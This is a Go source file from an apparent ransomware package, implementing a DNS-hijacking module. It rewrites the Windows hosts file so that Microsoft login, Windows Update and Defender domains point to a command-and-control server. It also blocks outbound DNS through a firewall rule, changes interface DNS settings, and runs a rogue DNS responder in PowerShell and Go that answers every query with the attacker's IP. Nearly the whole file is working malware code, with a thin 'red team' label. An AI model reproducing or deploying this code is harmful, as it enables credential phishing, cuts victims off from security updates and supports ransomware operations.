package ransomware

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

type WFPDNSPoison struct {
	config           *RansomwareConfig
	c2Server         string
	redirectMap      map[string]string
	activeRules      []string
}

type DNSRedirect struct {
	Original string
	Redirect string
	Method   string
}

func NewWFPDNSPoison(cfg *RansomwareConfig) *WFPDNSPoison {
	return &WFPDNSPoison{
		config: cfg,
		redirectMap: map[string]string{
			"login.microsoftonline.com":   "",
			"login.windows.net":           "",
			"device.login.microsoft.com":  "",
			"login.live.com":              "",
			"*.microsoft.com":             "",
			"*.windowsupdate.com":         "",
			"*.update.microsoft.com":      "",
			"*.defender.microsoft.com":    "",
			"*.security.microsoft.com":    "",
			"*.protection.office.com":     "",
		},
	}
}

func (w *WFPDNSPoison) SetC2Server(server string) {
	w.c2Server = server
	for k := range w.redirectMap {
		w.redirectMap[k] = server
	}
}

func (w *WFPDNSPoison) InstallWFPProvider() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("WFP requires Windows")
	}

	psScript := `
$providerName = "X404X DNS Filter"
$sublayerName = "X404X DNS Sublayer"

try {
    $provider = New-Object -TypeName Microsoft.Windows.FilteringPlatform.Provider
    $provider.Name = $providerName
    $provider.Description = "DNS filtering for red team operations"
} catch {
    Write-Host "WFP COM not available — using netsh fallback"
}
`
	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	out, _ := cmd.CombinedOutput()

	if strings.Contains(string(out), "not available") {
		return w.installViaNetSh()
	}

	return nil
}

func (w *WFPDNSPoison) installViaNetSh() error {
	exec.Command("netsh", "wfp", "show", "state").Run()

	exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		"name=X404X_DNS_Out", "dir=out", "protocol=UDP", "remoteport=53",
		"action=block").Run()

	return nil
}

func (w *WFPDNSPoison) AddDNSRedirect(original, redirect string) error {
	w.redirectMap[original] = redirect

	if runtime.GOOS == "windows" {
		hostsPath := "C:\\Windows\\System32\\drivers\\etc\\hosts"
		entry := fmt.Sprintf("%s\t%s # X404X\n", redirect, original)

		f, err := os.OpenFile(hostsPath, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			return err
		}
		defer f.Close()

		f.WriteString(entry)
	}

	return nil
}

func (w *WFPDNSPoison) FlushDNSCache() error {
	exec.Command("ipconfig", "/flushdns").Run()
	exec.Command("ipconfig", "/registerdns").Run()
	time.Sleep(100 * time.Millisecond)
	return nil
}

func (w *WFPDNSPoison) StartDNSServer(c2IP string, port int) error {
	if runtime.GOOS == "windows" {
		return w.startWindowsDNS(c2IP, port)
	}
	return w.startLinuxDNS(c2IP, port)
}

func (w *WFPDNSPoison) startWindowsDNS(c2IP string, port int) error {
	psScript := fmt.Sprintf(`
$endpoint = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, %d)
$udp = New-Object System.Net.Sockets.UdpClient $endpoint

while($true) {
    $remoteEP = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
    $data = $udp.Receive([ref]$remoteEP)
    $reader = [System.IO.BinaryReader]::new([System.IO.MemoryStream]::new($data))

    $txID = $reader.ReadUInt16()
    $flags = $reader.ReadUInt16()
    $questions = $reader.ReadUInt16()
    $answers = $reader.ReadUInt16()
    $authority = $reader.ReadUInt16()
    $additional = $reader.ReadUInt16()

    $name = ""
    while($true) {
        $len = $reader.ReadByte()
        if($len -eq 0) { break }
        $name += [System.Text.Encoding]::ASCII.GetString($reader.ReadBytes($len)) + "."
    }
    $name = $name.TrimEnd('.')
    $qType = $reader.ReadUInt16()
    $qClass = $reader.ReadUInt16()

    $response = [System.IO.MemoryStream]::new()
    $writer = [System.IO.BinaryWriter]::new($response)

    $writer.Write([BitConverter]::GetBytes(([uint16]$txID)))
    $writer.Write([BitConverter]::GetBytes([uint16]0x8180))
    $writer.Write([BitConverter]::GetBytes([uint16]1))
    $writer.Write([BitConverter]::GetBytes([uint16]1))
    $writer.Write([BitConverter]::GetBytes([uint16]0))
    $writer.Write([BitConverter]::GetBytes([uint16]0))

    foreach($label in $name.Split('.')) {
        $writer.Write([byte]$label.Length)
        $writer.Write([System.Text.Encoding]::ASCII.GetBytes($label))
    }
    $writer.Write([byte]0)
    $writer.Write([BitConverter]::GetBytes(([uint16]1)))
    $writer.Write([BitConverter]::GetBytes(([uint16]1)))

    $writer.Write([BitConverter]::GetBytes(([uint16]([uint16]$qType -bOR 0xC000))))
    $writer.Write([BitConverter]::GetBytes([uint16]1))
    $writer.Write([BitConverter]::GetBytes([uint16]0))
    $writer.Write([BitConverter]::GetBytes([uint32]300))
    $writer.Write([BitConverter]::GetBytes([uint16]4))
    $writer.Write([System.Net.IPAddress]::Parse('%s').GetAddressBytes())
    $writer.Flush()

    $udp.Send($response.ToArray(), $response.Length, $remoteEP)
    Write-Host "DNS: $name -> %s"
}
`, port, c2IP, c2IP)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
		"-Command", psScript)
	return cmd.Start()
}

func (w *WFPDNSPoison) startLinuxDNS(c2IP string, port int) error {
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%d", port))
	if err != nil {
		return err
	}

	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return err
	}

	go func() {
		defer conn.Close()
		buf := make([]byte, 512)
		for {
			n, remote, err := conn.ReadFromUDP(buf)
			if err != nil {
				return
			}

			if n < 12 {
				continue
			}

			txID := uint16(buf[0])<<8 | uint16(buf[1])
			queryName := extractDNSName(buf[12:n])
			_ = queryName

			response := make([]byte, 512)
			response[0] = buf[0]
			response[1] = buf[1]
			response[2] = 0x81
			response[3] = 0x80
			response[4] = 0x00
			response[5] = 0x01
			response[6] = 0x00
			response[7] = 0x01

			copy(response[12:], buf[12:n])
			pos := n
			response[pos] = 0xC0
			response[pos+1] = 0x0C
			response[pos+2] = 0x00
			response[pos+3] = 0x01
			response[pos+4] = 0x00
			response[pos+5] = 0x01
			response[pos+6] = 0x00
			response[pos+7] = 0x00
			response[pos+8] = 0x00
			response[pos+9] = 0x3C
			response[pos+10] = 0x00
			response[pos+11] = 0x04

			ip := net.ParseIP(c2IP)
			if ip != nil {
				ip4 := ip.To4()
				copy(response[pos+12:pos+16], ip4)
				conn.WriteToUDP(response[:pos+16], remote)
			}

			_ = txID
		}
	}()

	return nil
}

func extractDNSName(data []byte) string {
	var name string
	for i := 0; i < len(data); {
		length := int(data[i])
		if length == 0 {
			break
		}
		if i+1+length > len(data) {
			break
		}
		if name != "" {
			name += "."
		}
		name += string(data[i+1 : i+1+length])
		i += length + 1
	}
	return name
}

func (w *WFPDNSPoison) SetDNSInterface(iface string, dnsServer string) error {
	exec.Command("netsh", "interface", "ip", "set", "dns",
		iface, "static", dnsServer).Run()
	return nil
}

func (w *WFPDNSPoison) ForceNetworkFallback() error {
	exec.Command("ipconfig", "/release").Run()
	time.Sleep(2 * time.Second)
	exec.Command("ipconfig", "/renew").Run()
	return nil
}

func (w *WFPDNSPoison) ActivateFullDNSHijack(c2IP string, dnsPort int) map[string]interface{} {
	result := make(map[string]interface{})

	if runtime.GOOS == "windows" {
		w.InstallWFPProvider()
	}

	redirectsInstalled := 0
	for orig, rd := range w.redirectMap {
		if rd == "" {
			w.redirectMap[orig] = c2IP
		}
		if err := w.AddDNSRedirect(orig, w.redirectMap[orig]); err == nil {
			redirectsInstalled++
		}
	}
	result["redirects_installed"] = redirectsInstalled

	if err := w.FlushDNSCache(); err != nil {
		result["dns_flush"] = fmt.Sprintf("error: %v", err)
	} else {
		result["dns_flush"] = "ok"
	}

	if err := w.StartDNSServer(c2IP, dnsPort); err != nil {
		result["dns_server"] = fmt.Sprintf("error: %v", err)
	} else {
		result["dns_server"] = fmt.Sprintf("listening on :%d", dnsPort)
	}

	return result
}

func (w *WFPDNSPoison) Deactivate() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	hostsPath := "C:\\Windows\\System32\\drivers\\etc\\hosts"
	data, err := os.ReadFile(hostsPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(data), "\n")
	var cleaned []string
	for _, line := range lines {
		if !strings.Contains(line, "# X404X") {
			cleaned = append(cleaned, line)
		}
	}

	os.WriteFile(hostsPath, []byte(strings.Join(cleaned, "\n")), 0644)
	w.FlushDNSCache()

	exec.Command("netsh", "advfirewall", "firewall", "delete", "rule",
		"name=X404X_DNS_Out").Run()

	return nil
}

var _, _, _ = syscall.Syscall(0, 0, 0, 0)
